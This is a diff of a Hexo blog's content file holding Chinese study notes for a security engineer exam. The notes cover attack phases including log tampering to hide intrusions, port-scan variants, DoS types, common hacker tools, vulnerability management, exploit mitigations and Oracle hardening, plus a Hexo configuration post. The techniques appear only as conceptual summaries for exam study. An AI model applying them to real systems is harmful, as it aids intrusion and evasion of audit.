+<li>清除攻击痕迹。（篡改日志文件的审计信息，改变系统时间造成日志文件紊乱，删除或停止审计服务进程，干扰入侵检测系统正常运行，修改完整性标签）</li>
+</ol>
+<h1 id="网络攻击常见技术方法"><a href="#网络攻击常见技术方法" class="headerlink" title="网络攻击常见技术方法"></a>网络攻击常见技术方法</h1><p><strong>端口扫描</strong></p>
+<ul>
+<li>完全连接扫描（利用三次握手，建立一次完整的连接）</li>
+<li>半连接扫描（三次握手过程中，只完成前两次握手）</li>
+<li>SYN扫描（发送连接请求，主机响应后，立即切断连接。若返回ACK信息，则表示端口开放，若返回RESET，则表示端口未开放）</li>
+<li>ID头信息扫描（源主机A向主机B发出连续PING包，源主机A假冒主机B向目标主机C发送SYN包，主机C向主机B发送两种可能的包（SYN|ACK，RST|ACK），查看主机B返回A的包ID头的值是否增加1，大于1则端口非开放。）</li>
+<li>隐蔽扫描（绕过IDS、防火墙等安全机制）</li>
+<li>SYN|ACK扫描（直接发送SYN|ACK包，目标主机认为是一次错误连接，若端口没开放，则返回RST信息；若端口开发，则不返回任何信息）</li>
+<li>FIN扫描（发送FIN包，若返回RESET信息，则端口关闭；若没返回任何信息，则端口开放）</li>
+<li>ACK扫描（先发送FIN包，查看反馈数据包的TTL值和WIN值。端口开放：TTL<64，WIN>0；端口关闭：TTL&gt;64，WIN=0）</64，WIN></li>
+<li>NULL扫描（源主机将数据包中ACK、FIN、RST、SYN、URG、PSH等标志位全部置空。若未返回信息，则端口开放；若返回RST信息，则端口关闭）</li>
+<li>XMAS扫描（将数据包中ACK、FIN、RST、SYN、URG、PSH等头标志位全部置1.若未返回信息，则端口开放；若返回RST信息，则端口关闭）</li>
+</ul>
+<p><strong>口令破解</strong></p>
+<p><strong>缓冲区溢出</strong></p>
+<p>攻击者将特意构造的攻击代码植入缓冲区溢出漏洞的程序中，改变漏洞程序的执行过程，获取攻击主机的控制权。</p>
+<p><strong>恶意代码</strong></p>
+<p>类型有计算机病毒、网络蠕虫、特洛伊木马、后门、逻辑炸弹、僵尸网络等</p>
+<p><strong>拒绝服务</strong></p>
+<p>特点：①难确认性②隐蔽性③资源有限性④软件复杂性</p>
+<ul>
+<li>同步包风暴（SYN Flood）</li>
+<li>UDP洪水（UDP Flood）</li>
+<li>Smurf攻击</li>
+<li>垃圾邮件</li>
+<li>消耗CPU和内存资源等拒绝服务攻击</li>
+<li>死亡之ping（ping of death）</li>
+<li>泪滴攻击（Teardrop Attack）</li>
+<li>分布式拒绝服务攻击（Distribute Denial of Service Attack）</li>
+</ul>
+<p><strong>网络钓鱼</strong></p>
+<p><strong>网络窃听</strong></p>
+<p>技术手段：网络嗅探、中间人攻击</p>
+<p><strong>SQL注入</strong></p>
+<p><strong>社交工程</strong></p>
+<p><strong>电子监听</strong></p>
+<p><strong>会话劫持</strong></p>
+<p><strong>漏洞扫描</strong></p>
+<p>扫描技术：CGI漏洞扫描、弱口令扫描、操作系统漏洞扫描、数据库漏洞扫描</p>
+<p><strong>代理技术</strong></p>
+<p><strong>数据加密</strong></p>
+<h1 id="黑客常用工具"><a href="#黑客常用工具" class="headerlink" title="黑客常用工具"></a>黑客常用工具</h1><p><strong>扫描器</strong>：NMAP、Nessus、SuperScan</p>
+<p><strong>远程监控</strong>：冰河、网络精灵、Netcat</p>
+<p><strong>密码破解</strong>：John the Ripper、LOphtCrack</p>
+<p><strong>网络嗅探器</strong>：Tcpdump/WireShark、DSniff</p>
+<p><strong>安全渗透工具箱</strong>：Metasploit、BackTrack5</p>
 ]]></content>
       <categories>
-        <category>hexo</category>
+        <category>信息安全工程师软考</category>
       </categories>
       <tags>
-        <tag>next</tag>
+        <tag>学习笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -1546,6 +1515,37 @@ C^d=M mod (P)</script><p>在已知C和P的前提下，由d求M很容易，由M�
       </categories>
       <tags>
         <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo及next主题使用问题记录</title>
+    <url>/2020/09/11/hexo%E5%8F%8Anext%E4%B8%BB%E9%A2%98%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p><strong>不定期更新各类使用过程中遇到的问题</strong></p>
+<p>使用版本：hexo 5.1&amp;&amp;next 7.8</p>
+<a id="more"></a>
+<h1 id="问题一："><a href="#问题一：" class="headerlink" title="问题一："></a>问题一：</h1><p>点击“阅读全文”后，会直接滚动到原文中\<!-- more -->下，且config里面没有scroll_to_more配置，如何从头开始阅读。</p>
+<p>参考博文<a href="https://blog.csdn.net/weizhixiang/article/details/105112467">hexo关于next主题scroll_to_more失效</a>进行如下设置</p>
+<p>修改\themes\next\layout_macro\post.swig中</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(post.path) &#125;&#125;#more&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;contents&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>为</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(post.path) &#125;&#125;&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;contents&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="问题二："><a href="#问题二：" class="headerlink" title="问题二："></a>问题二：</h1><p>markdown语法嵌入数学公式无法正常显示</p>
+<p>参考<a href="https://www.jianshu.com/p/7ab21c7f0674">在Hexo中渲染MathJax数学公式</a></p>
+<p>更换渲染引擎：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
+<p>更改node_modules\kramed\lib\rules\inline.js文件中第11行和第20行</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  escape: /^\\([\\`*&#123;&#125;\[\]()#$+\-.!_&gt;])/,</span></span><br><span class="line">  <span class="built_in">escape</span>: <span class="regexp">/^\\([`*\[\]()#$+\-.!_&gt;])/</span>，</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  em: /^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span></span><br><span class="line">  em: <span class="regexp">/^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span></span><br></pre></td></tr></table></figure>
+<p>在主题中配置文件中开启mathjax开关</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># MathJax Support</span></span><br><span class="line">mathjax:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  per_page: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<p>还需要在文章的Front-matter里打开mathjax开关</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: index.html</span><br><span class="line">date: 2016-12-28 21:01:30</span><br><span class="line">tags:</span><br><span class="line">mathjax: true</span><br><span class="line">--</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>next</tag>
       </tags>
   </entry>
   <entry>
@@ -2445,6 +2445,106 @@ C^d=M mod (P)</script><p>在已知C和P的前提下，由d求M很容易，由M�
       </tags>
   </entry>
   <entry>
+    <title>第13章 网络安全漏洞防护技术原理与应用</title>
+    <url>/2020/09/23/%E7%AC%AC13%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="网络安全漏洞概述"><a href="#网络安全漏洞概述" class="headerlink" title="网络安全漏洞概述"></a>网络安全漏洞概述</h1><p>影响：机密性受损、完整性破坏、可用性降低、抗抵赖性缺失、可控性下降、真实性不保等</p>
+<h2 id="网络安全漏洞威胁"><a href="#网络安全漏洞威胁" class="headerlink" title="网络安全漏洞威胁"></a>网络安全漏洞威胁</h2><p><img src="/2020/09/23/%E7%AC%AC13%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/漏洞利用.jpg" style="zoom:50%;"></p>
+<a id="more"></a>
+<h1 id="网络安全漏洞分类与管理"><a href="#网络安全漏洞分类与管理" class="headerlink" title="网络安全漏洞分类与管理"></a>网络安全漏洞分类与管理</h1><h2 id="网络安全漏洞来源"><a href="#网络安全漏洞来源" class="headerlink" title="网络安全漏洞来源"></a>网络安全漏洞来源</h2><ul>
+<li>非技术安全漏洞：涉及管理组织结构、管理制度、管理流程、人员管理<ol>
+<li>网络安全责任主体不明确</li>
+<li>网络安全策略不完备</li>
+<li>网络安全操作技能不足</li>
+<li>网络安全监督缺失</li>
+<li>网络安全特权控制不完备</li>
+</ol>
+</li>
+<li>技术性安全漏洞：涉及网络结构、通信协议、设备、软件产品、系统配置、应用系统<ol>
+<li>设计错误</li>
+<li>输入验证错误</li>
+<li>缓冲区溢出</li>
+<li>意外情况处置错误</li>
+<li>访问验证错误</li>
+<li>配置错误</li>
+<li>竞争条件</li>
+<li>环境错误</li>
+</ol>
+</li>
+</ul>
+<h2 id="网络安全漏洞分类"><a href="#网络安全漏洞分类" class="headerlink" title="网络安全漏洞分类"></a>网络安全漏洞分类</h2><ol>
+<li>CVE漏洞分类</li>
+<li>CVSS（通用漏洞计分系统，由基本度量计分、时序度量计分、环境度量计分组成）</li>
+<li>我国信息安全漏洞分类<ol>
+<li>国家信息安全漏洞库（CNNVD）漏洞分类</li>
+<li>国家信息安全漏洞共享平台（CNVD）漏洞分类</li>
+</ol>
+</li>
+<li>OWASP TOP 10 漏洞分类</li>
+</ol>
+<h2 id="网络安全漏洞发布"><a href="#网络安全漏洞发布" class="headerlink" title="网络安全漏洞发布"></a>网络安全漏洞发布</h2><p>发布方式：网站、电子邮件以及安全论坛</p>
+<h2 id="网络安全漏洞信息获取"><a href="#网络安全漏洞信息获取" class="headerlink" title="网络安全漏洞信息获取"></a>网络安全漏洞信息获取</h2><p>国内外漏洞信息来源主要有四个方面：网络安全应急响应机构；网络安全厂商；IT产品或系统提供商；网络安全组织。</p>
+<p>国内外网络安全漏洞信息发布等主要来源：CERT；Security Focus Vulnerability Database；国家信息安全漏洞库CNNVD；国家信息安全漏洞共享平台CNVD；厂商漏洞信息</p>
+<h2 id="网络安全漏洞管理过程"><a href="#网络安全漏洞管理过程" class="headerlink" title="网络安全漏洞管理过程"></a>网络安全漏洞管理过程</h2><p>主要包含以下环节：</p>
+<ol>
+<li>网络信息系统资产确认</li>
+<li>网络安全漏洞信息采集</li>
+<li>网络安全漏洞评估</li>
+<li>网络安全漏洞消除和控制</li>
+<li>网络安全漏洞变化跟踪</li>
+</ol>
+<h1 id="网络安全漏洞扫描技术与应用"><a href="#网络安全漏洞扫描技术与应用" class="headerlink" title="网络安全漏洞扫描技术与应用"></a>网络安全漏洞扫描技术与应用</h1><h2 id="网络安全漏洞扫描"><a href="#网络安全漏洞扫描" class="headerlink" title="网络安全漏洞扫描"></a>网络安全漏洞扫描</h2><p>漏洞扫描器一般包括用户界面、扫描引擎、漏洞扫描结果分析、漏洞信息及配置参数库等主要功能模块</p>
+<ol>
+<li><p>主机漏洞扫描器</p>
+<p>技术原理：通过检查本地系统中关键性文件等内容及安全属性，来发现漏洞。</p>
+</li>
+<li><p>网络漏洞扫描器</p>
+<p>技术原理：通过与待扫描等目标机建立网络连接后，发送特定网络请求进行漏洞检查</p>
+</li>
+<li><p>专用漏洞扫描器</p>
+</li>
+</ol>
+<h2 id="网络安全漏洞扫描应用"><a href="#网络安全漏洞扫描应用" class="headerlink" title="网络安全漏洞扫描应用"></a>网络安全漏洞扫描应用</h2><p>常用于：网络信息系统安全检查和风险评估。</p>
+<h1 id="网络安全漏洞处置技术与应用"><a href="#网络安全漏洞处置技术与应用" class="headerlink" title="网络安全漏洞处置技术与应用"></a>网络安全漏洞处置技术与应用</h1><h2 id="网络安全漏洞发现技术"><a href="#网络安全漏洞发现技术" class="headerlink" title="网络安全漏洞发现技术"></a>网络安全漏洞发现技术</h2><p>发现方法主要依赖于人工安全性分析、工具自动化检测及人工智能辅助分析。</p>
+<p>发现技术：文本搜索、词法分析、范围检查、状态机检查、错误注入、模糊测试、动态污点分析、形式化验证等</p>
+<h2 id="网络安全漏洞修补技术"><a href="#网络安全漏洞修补技术" class="headerlink" title="网络安全漏洞修补技术"></a>网络安全漏洞修补技术</h2><p><img src="/2020/09/23/%E7%AC%AC13%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/补丁管理.jpg" style="zoom:50%;"></p>
+<h2 id="网络安全漏洞利用防范技术"><a href="#网络安全漏洞利用防范技术" class="headerlink" title="网络安全漏洞利用防范技术"></a>网络安全漏洞利用防范技术</h2><ol>
+<li>地址空间随机化技术（ASLR）</li>
+<li>数据执行阻止（DEP）：保护程序堆栈区域，防止执行</li>
+<li>SEHOP：防止攻击者利用SEH重写</li>
+<li>堆栈保护：设置完整性标记检测函数调用返回地址是否被篡改</li>
+<li>虚拟补丁：对未进行补丁修复的程序，过滤漏洞攻击数据包</li>
+</ol>
+<h1 id="网络安全漏洞防护主要产品与技术指标"><a href="#网络安全漏洞防护主要产品与技术指标" class="headerlink" title="网络安全漏洞防护主要产品与技术指标"></a>网络安全漏洞防护主要产品与技术指标</h1><h2 id="网络安全漏洞扫描器"><a href="#网络安全漏洞扫描器" class="headerlink" title="网络安全漏洞扫描器"></a>网络安全漏洞扫描器</h2><p>常见技术指标：</p>
+<ul>
+<li>漏洞扫描主机数量</li>
+<li>漏洞扫描并发数</li>
+<li>漏洞扫描速度</li>
+<li>漏洞检测能力</li>
+<li>数据库漏洞检查功能</li>
+<li>Web应用漏洞检查功能</li>
+<li>口令检查功能</li>
+<li>标准兼容性</li>
+<li>部署环境难易程度</li>
+</ul>
+<h2 id="网络安全漏洞服务平台"><a href="#网络安全漏洞服务平台" class="headerlink" title="网络安全漏洞服务平台"></a>网络安全漏洞服务平台</h2><p>相关的产品与服务，如：漏洞盒子、补天漏洞响应平台、网络威胁情报服务等</p>
+<h2 id="网络安全漏洞防护网关"><a href="#网络安全漏洞防护网关" class="headerlink" title="网络安全漏洞防护网关"></a>网络安全漏洞防护网关</h2><p>原理：从网络流量中提取和识别漏洞利用特征模式，阻止攻击者对目标系统等漏洞利用</p>
+<p>常见形式：IPS、WAF、UTM</p>
+<p>技术指标：</p>
+<ul>
+<li>阻断安全漏洞攻击等种类与数量</li>
+<li>阻断安全漏洞攻击等准确率</li>
+<li>阻断安全漏洞攻击等性能</li>
+<li>支持网络带宽的能力</li>
+</ul>
+]]></content>
+      <categories>
+        <category>信息安全工程师软考</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>第14章 恶意代码防范技术原理</title>
     <url>/2020/09/23/%E7%AC%AC14%E7%AB%A0-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%98%B2%E8%8C%83%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</url>
     <content><![CDATA[<h1 id="恶意代码概述"><a href="#恶意代码概述" class="headerlink" title="恶意代码概述"></a>恶意代码概述</h1><p>根据恶意代码传播特性，分为：</p>
@@ -2740,106 +2840,6 @@ C^d=M mod (P)</script><p>在已知C和P的前提下，由d求M很容易，由M�
 </ol>
 <h1 id="恶意代码防护技术应用"><a href="#恶意代码防护技术应用" class="headerlink" title="恶意代码防护技术应用"></a>恶意代码防护技术应用</h1><p>终端防护</p>
 <p>APT防护</p>
-]]></content>
-      <categories>
-        <category>信息安全工程师软考</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>第13章 网络安全漏洞防护技术原理与应用</title>
-    <url>/2020/09/23/%E7%AC%AC13%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="网络安全漏洞概述"><a href="#网络安全漏洞概述" class="headerlink" title="网络安全漏洞概述"></a>网络安全漏洞概述</h1><p>影响：机密性受损、完整性破坏、可用性降低、抗抵赖性缺失、可控性下降、真实性不保等</p>
-<h2 id="网络安全漏洞威胁"><a href="#网络安全漏洞威胁" class="headerlink" title="网络安全漏洞威胁"></a>网络安全漏洞威胁</h2><p><img src="/2020/09/23/%E7%AC%AC13%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/漏洞利用.jpg" style="zoom:50%;"></p>
-<a id="more"></a>
-<h1 id="网络安全漏洞分类与管理"><a href="#网络安全漏洞分类与管理" class="headerlink" title="网络安全漏洞分类与管理"></a>网络安全漏洞分类与管理</h1><h2 id="网络安全漏洞来源"><a href="#网络安全漏洞来源" class="headerlink" title="网络安全漏洞来源"></a>网络安全漏洞来源</h2><ul>
-<li>非技术安全漏洞：涉及管理组织结构、管理制度、管理流程、人员管理<ol>
-<li>网络安全责任主体不明确</li>
-<li>网络安全策略不完备</li>
-<li>网络安全操作技能不足</li>
-<li>网络安全监督缺失</li>
-<li>网络安全特权控制不完备</li>
-</ol>
-</li>
-<li>技术性安全漏洞：涉及网络结构、通信协议、设备、软件产品、系统配置、应用系统<ol>
-<li>设计错误</li>
-<li>输入验证错误</li>
-<li>缓冲区溢出</li>
-<li>意外情况处置错误</li>
-<li>访问验证错误</li>
-<li>配置错误</li>
-<li>竞争条件</li>
-<li>环境错误</li>
-</ol>
-</li>
-</ul>
-<h2 id="网络安全漏洞分类"><a href="#网络安全漏洞分类" class="headerlink" title="网络安全漏洞分类"></a>网络安全漏洞分类</h2><ol>
-<li>CVE漏洞分类</li>
-<li>CVSS（通用漏洞计分系统，由基本度量计分、时序度量计分、环境度量计分组成）</li>
-<li>我国信息安全漏洞分类<ol>
-<li>国家信息安全漏洞库（CNNVD）漏洞分类</li>
-<li>国家信息安全漏洞共享平台（CNVD）漏洞分类</li>
-</ol>
-</li>
-<li>OWASP TOP 10 漏洞分类</li>
-</ol>
-<h2 id="网络安全漏洞发布"><a href="#网络安全漏洞发布" class="headerlink" title="网络安全漏洞发布"></a>网络安全漏洞发布</h2><p>发布方式：网站、电子邮件以及安全论坛</p>
-<h2 id="网络安全漏洞信息获取"><a href="#网络安全漏洞信息获取" class="headerlink" title="网络安全漏洞信息获取"></a>网络安全漏洞信息获取</h2><p>国内外漏洞信息来源主要有四个方面：网络安全应急响应机构；网络安全厂商；IT产品或系统提供商；网络安全组织。</p>
-<p>国内外网络安全漏洞信息发布等主要来源：CERT；Security Focus Vulnerability Database；国家信息安全漏洞库CNNVD；国家信息安全漏洞共享平台CNVD；厂商漏洞信息</p>
-<h2 id="网络安全漏洞管理过程"><a href="#网络安全漏洞管理过程" class="headerlink" title="网络安全漏洞管理过程"></a>网络安全漏洞管理过程</h2><p>主要包含以下环节：</p>
-<ol>
-<li>网络信息系统资产确认</li>
-<li>网络安全漏洞信息采集</li>
-<li>网络安全漏洞评估</li>
-<li>网络安全漏洞消除和控制</li>
-<li>网络安全漏洞变化跟踪</li>
-</ol>
-<h1 id="网络安全漏洞扫描技术与应用"><a href="#网络安全漏洞扫描技术与应用" class="headerlink" title="网络安全漏洞扫描技术与应用"></a>网络安全漏洞扫描技术与应用</h1><h2 id="网络安全漏洞扫描"><a href="#网络安全漏洞扫描" class="headerlink" title="网络安全漏洞扫描"></a>网络安全漏洞扫描</h2><p>漏洞扫描器一般包括用户界面、扫描引擎、漏洞扫描结果分析、漏洞信息及配置参数库等主要功能模块</p>
-<ol>
-<li><p>主机漏洞扫描器</p>
-<p>技术原理：通过检查本地系统中关键性文件等内容及安全属性，来发现漏洞。</p>
-</li>
-<li><p>网络漏洞扫描器</p>
-<p>技术原理：通过与待扫描等目标机建立网络连接后，发送特定网络请求进行漏洞检查</p>
-</li>
-<li><p>专用漏洞扫描器</p>
-</li>
-</ol>
-<h2 id="网络安全漏洞扫描应用"><a href="#网络安全漏洞扫描应用" class="headerlink" title="网络安全漏洞扫描应用"></a>网络安全漏洞扫描应用</h2><p>常用于：网络信息系统安全检查和风险评估。</p>
-<h1 id="网络安全漏洞处置技术与应用"><a href="#网络安全漏洞处置技术与应用" class="headerlink" title="网络安全漏洞处置技术与应用"></a>网络安全漏洞处置技术与应用</h1><h2 id="网络安全漏洞发现技术"><a href="#网络安全漏洞发现技术" class="headerlink" title="网络安全漏洞发现技术"></a>网络安全漏洞发现技术</h2><p>发现方法主要依赖于人工安全性分析、工具自动化检测及人工智能辅助分析。</p>
-<p>发现技术：文本搜索、词法分析、范围检查、状态机检查、错误注入、模糊测试、动态污点分析、形式化验证等</p>
-<h2 id="网络安全漏洞修补技术"><a href="#网络安全漏洞修补技术" class="headerlink" title="网络安全漏洞修补技术"></a>网络安全漏洞修补技术</h2><p><img src="/2020/09/23/%E7%AC%AC13%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/补丁管理.jpg" style="zoom:50%;"></p>
-<h2 id="网络安全漏洞利用防范技术"><a href="#网络安全漏洞利用防范技术" class="headerlink" title="网络安全漏洞利用防范技术"></a>网络安全漏洞利用防范技术</h2><ol>
-<li>地址空间随机化技术（ASLR）</li>
-<li>数据执行阻止（DEP）：保护程序堆栈区域，防止执行</li>
-<li>SEHOP：防止攻击者利用SEH重写</li>
-<li>堆栈保护：设置完整性标记检测函数调用返回地址是否被篡改</li>
-<li>虚拟补丁：对未进行补丁修复的程序，过滤漏洞攻击数据包</li>
-</ol>
-<h1 id="网络安全漏洞防护主要产品与技术指标"><a href="#网络安全漏洞防护主要产品与技术指标" class="headerlink" title="网络安全漏洞防护主要产品与技术指标"></a>网络安全漏洞防护主要产品与技术指标</h1><h2 id="网络安全漏洞扫描器"><a href="#网络安全漏洞扫描器" class="headerlink" title="网络安全漏洞扫描器"></a>网络安全漏洞扫描器</h2><p>常见技术指标：</p>
-<ul>
-<li>漏洞扫描主机数量</li>
-<li>漏洞扫描并发数</li>
-<li>漏洞扫描速度</li>
-<li>漏洞检测能力</li>
-<li>数据库漏洞检查功能</li>
-<li>Web应用漏洞检查功能</li>
-<li>口令检查功能</li>
-<li>标准兼容性</li>
-<li>部署环境难易程度</li>
-</ul>
-<h2 id="网络安全漏洞服务平台"><a href="#网络安全漏洞服务平台" class="headerlink" title="网络安全漏洞服务平台"></a>网络安全漏洞服务平台</h2><p>相关的产品与服务，如：漏洞盒子、补天漏洞响应平台、网络威胁情报服务等</p>
-<h2 id="网络安全漏洞防护网关"><a href="#网络安全漏洞防护网关" class="headerlink" title="网络安全漏洞防护网关"></a>网络安全漏洞防护网关</h2><p>原理：从网络流量中提取和识别漏洞利用特征模式，阻止攻击者对目标系统等漏洞利用</p>
-<p>常见形式：IPS、WAF、UTM</p>
-<p>技术指标：</p>
-<ul>
-<li>阻断安全漏洞攻击等种类与数量</li>
-<li>阻断安全漏洞攻击等准确率</li>
-<li>阻断安全漏洞攻击等性能</li>
-<li>支持网络带宽的能力</li>
-</ul>
 ]]></content>
       <categories>
         <category>信息安全工程师软考</category>
@@ -3277,131 +3277,134 @@ Dec[En(a)⊙En(b)]=a⊕b</script><p>En加密运算，Dec解密运算，当$⊕$�
       </tags>
   </entry>
   <entry>
-    <title>第20章 数据库系统安全</title>
-    <url>/2020/09/27/%E7%AC%AC20%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/</url>
-    <content><![CDATA[<h1 id="数据库安全概况"><a href="#数据库安全概况" class="headerlink" title="数据库安全概况"></a>数据库安全概况</h1><h2 id="数据库安全威胁"><a href="#数据库安全威胁" class="headerlink" title="数据库安全威胁"></a>数据库安全威胁</h2><ol>
-<li>授权的误用</li>
-<li>逻辑推断和汇聚：不敏感数据汇聚推断出敏感数据</li>
-<li>伪装</li>
-<li>旁路控制</li>
-<li>隐蔽信道</li>
-<li>SQL注入攻击</li>
-<li>数据库口令密码破解</li>
-<li>硬件及介质攻击</li>
-</ol>
+    <title>第18章 网络安全测评技术与标准</title>
+    <url>/2020/09/25/%E7%AC%AC18%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%84%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%A0%87%E5%87%86/</url>
+    <content><![CDATA[<h1 id="网络安全测评概况"><a href="#网络安全测评概况" class="headerlink" title="网络安全测评概况"></a>网络安全测评概况</h1><p>测评对象包括：信息系统的组成要素或信息系统自身</p>
+<p><img src="/2020/09/25/%E7%AC%AC18%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%84%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%A0%87%E5%87%86/测评对象和内容.jpg" style="zoom:50%;"></p>
 <a id="more"></a>
-<h2 id="数据库安全隐患"><a href="#数据库安全隐患" class="headerlink" title="数据库安全隐患"></a>数据库安全隐患</h2><ol>
-<li>数据库用户账号和密码隐患</li>
-<li>数据库系统扩展存储过程隐患</li>
-<li>数据库系统软件和应用程序漏洞</li>
-<li>数据库系统权限分配隐患</li>
-<li>数据库系统用户安全意识薄弱</li>
-<li>网络通信内容是明文传递</li>
-<li>数据库系统安全机制不健全</li>
-</ol>
-<h2 id="数据库安全需求"><a href="#数据库安全需求" class="headerlink" title="数据库安全需求"></a>数据库安全需求</h2><ol>
-<li>数据库标识与鉴别</li>
-<li>数据库访问控制</li>
-<li>数据库安全审计</li>
-<li>数据库备份与恢复</li>
-<li>数据库加密</li>
-<li>资源限制</li>
-<li>数据库安全加固</li>
-<li>数据库安全管理</li>
-</ol>
-<h1 id="数据库安全机制与实现技术"><a href="#数据库安全机制与实现技术" class="headerlink" title="数据库安全机制与实现技术"></a>数据库安全机制与实现技术</h1><h2 id="数据库安全机制"><a href="#数据库安全机制" class="headerlink" title="数据库安全机制"></a>数据库安全机制</h2><p><img src="/2020/09/27/%E7%AC%AC20%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/安全机制.jpg" style="zoom:50%;"></p>
-<h2 id="数据库加密"><a href="#数据库加密" class="headerlink" title="数据库加密"></a>数据库加密</h2><p>加密方式：</p>
-<ul>
-<li>数据库网上传输的数据，通常利用SSL协议来实现</li>
-<li>数据库存储的数据，通过数据库存储加密来实现</li>
-</ul>
-<p>数据库存储加密方式：库内加密和库外加密</p>
-<p>常用技术：基于文件的数据库加密技术、基于记录的数据库机密技术、基于字段的数据库文件进行加密</p>
-<h2 id="数据库防火墙"><a href="#数据库防火墙" class="headerlink" title="数据库防火墙"></a>数据库防火墙</h2><p>安全作用：</p>
-<ul>
-<li>屏蔽直接访问数据库的通道</li>
-<li>增强认证</li>
-<li>攻击检测</li>
-<li>防止漏洞利用</li>
-<li>防止内部高危操作</li>
-<li>防止敏感数据泄露</li>
-<li>数据库安全审计</li>
-</ul>
-<h2 id="数据库脱敏"><a href="#数据库脱敏" class="headerlink" title="数据库脱敏"></a>数据库脱敏</h2><p>常见技术方法：屏蔽、变形、替换、随机、加密</p>
-<h1 id="Oracle数据库安全分析与防护"><a href="#Oracle数据库安全分析与防护" class="headerlink" title="Oracle数据库安全分析与防护"></a>Oracle数据库安全分析与防护</h1><h2 id="Oracle数据库安全分析"><a href="#Oracle数据库安全分析" class="headerlink" title="Oracle数据库安全分析"></a>Oracle数据库安全分析</h2><p>安全机制和技术：用户认证、访问控制（网络和数据对象授权控制）、特权管理、安全审计和数据库防火墙、透明加密</p>
-<h2 id="Oracle数据库安全最佳实践"><a href="#Oracle数据库安全最佳实践" class="headerlink" title="Oracle数据库安全最佳实践"></a>Oracle数据库安全最佳实践</h2><ol>
-<li>增强Oracle数据库服务器的操作系统安全</li>
-<li>最小化安装Oracle，删除不必要组件</li>
-<li>安装最新的安全补丁</li>
-<li>删除或修改默认的用户名和密码</li>
-<li>启用认证机制</li>
-<li>设置好的口令密码策略</li>
-<li>设置最小化权限<ul>
-<li>UTL_FILE：读取服务器上文件</li>
-<li>UTL_HTTP：通过HTTP访问外部资源</li>
-<li>UTL_TCP：通过TCP建立连接，从网络得到可执行文件</li>
-<li>UTL_SMTP：通过SMTP转发关键文件</li>
-</ul>
-</li>
